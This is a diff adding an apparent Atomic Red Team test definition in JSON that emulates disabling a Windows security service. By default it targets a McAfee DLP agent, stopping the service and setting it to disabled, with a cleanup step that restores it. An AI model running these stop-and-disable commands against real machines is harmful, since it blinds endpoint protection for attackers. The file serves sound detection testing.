@@ -1,0 +1,52 @@
+{
+  "id": "a1230893-56ac-4c81-b644-2108e982f8f5",
+  "name": "Disable Arbitrary Security Windows Service",
+  "description": "With administrative rights, an adversary can disable Windows Services related to security products. This test requires McAfeeDLPAgentService to be installed.\nChange the service_name input argument for your AV solution. Upon exeuction, infomration will be displayed stating the status of the service.\nTo verify that the service has stopped, run \"sc query McAfeeDLPAgentService\"\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "9e96172d-6cc7-4c7d-ba98-b5797a8bcee7",
+      "type": "execute-command",
+      "data": {
+        "command": "net.exe stop #{service_name}\nsc.exe config #{service_name} start= disabled\n",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "914098fd-27c6-4d27-ad7b-e326655b5ad9",
+      "type": "execute-command",
+      "data": {
+        "command": "sc.exe config #{service_name} start= auto \u003enul 2\u003e\u00261\nnet.exe start #{service_name} \u003enul 2\u003e\u00261\n",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "9e96172d-6cc7-4c7d-ba98-b5797a8bcee7",
+      "p": "on-success",
+      "o": "914098fd-27c6-4d27-ad7b-e326655b5ad9"
+    },
+    {
+      "s": "9e96172d-6cc7-4c7d-ba98-b5797a8bcee7",
+      "p": "on-failure",
+      "o": "914098fd-27c6-4d27-ad7b-e326655b5ad9"
+    }
+  ],
+  "tags": [
+    "T1562.001",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "service_name",
+      "type": "string",
+      "description": "The name of the service to stop",
+      "value": "McAfeeDLPAgentService"
+    }
+  ]
+}
